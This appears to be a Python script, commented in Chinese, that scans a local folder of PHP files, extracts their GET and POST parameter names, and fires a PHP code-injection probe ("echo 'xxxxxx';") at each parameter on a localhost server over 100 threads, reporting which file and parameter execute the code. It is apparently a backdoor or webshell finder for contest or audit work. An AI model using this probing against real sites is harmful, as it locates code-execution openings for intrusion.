import os
import requests
import re
import threading
import time
from datetime import datetime

print('开始时间: ' + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

# 这儿设置最大的线程数
s1 = threading.Semaphore(100)  

filePath = os.path.expandvars("$HOME/desktop/src/")
os.chdir(filePath)  # 改变当前的路径

requests.adapters.DEFAULT_RETRIES = 5  # 设置重连次数，防止线程数过高，断开连接
files = os.listdir(filePath)

session = requests.Session()
session.keep_alive = False  # 设置连接活跃状态为False

final_result = []

def get_content(file):
    # 资源获取：一个线程调用 s1.acquire() 时，它试图获取一个资源。如果当前活跃的线程数少于100，这个调用会立即返回，允许线程继续执行。
    # 阻塞机制：如果已经有100个线程在执行，再有线程调用 acquire() 会被阻塞，直到其他线程释放资源。
    s1.acquire() # 过载
    print('trying   ' + file + '     ' + str(datetime.now()))
    with open(file, encoding='utf-8') as f:  # 打开php文件，提取所有的$_GET和$_POST的参数
        gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
        f.seek(0)  # 重置文件指针到开始位置
        posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))

    params = {}  # 所有的$_GET
    data = {}  # 所有的$_POST
    for m in gets:
        params[m] = "echo 'xxxxxx';"
    for n in posts:
        data[n] = "echo 'xxxxxx';"
    print('params: ', params)
    print('data: ', data)
    url = 'http://localhost:8080/src/'+file
    req = session.post(url, data=data, params=params)  # 一次性请求所有的GET和POST
    req.close()                          # 关闭请求  释放内存
    req.encoding = 'utf-8'
    content = req.text
    # print(content)
    if "xxxxxx" in content:  # 如果发现有可以利用的参数，继续筛选出具体的参数
        flag = 0
        for a in gets:
            req = session.get(url+'?%s=' % a+"echo 'xxxxxx';")
            content = req.text
            req.close()                                                # 关闭请求  释放内存
            if "xxxxxx" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b: "echo 'xxxxxx';"})
                content = req.text
                req.close()                                                # 关闭请求  释放内存
                if "xxxxxx" in content:
                    break
        if flag == 1:  # flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
            param = a
        else:
            param = b
        print('找到了利用文件： '+file+"  and 找到了利用的参数：%s" % param)
        print('结束时间：  ' + time.asctime(time.localtime(time.time())))
        final_result.append(file + "  and  " + param)

    s1.release()


for i in files[:2]:  # 加入多线程
    print(i)
    t = threading.Thread(target=get_content, args=(i,))
    t.start()

print(final_result)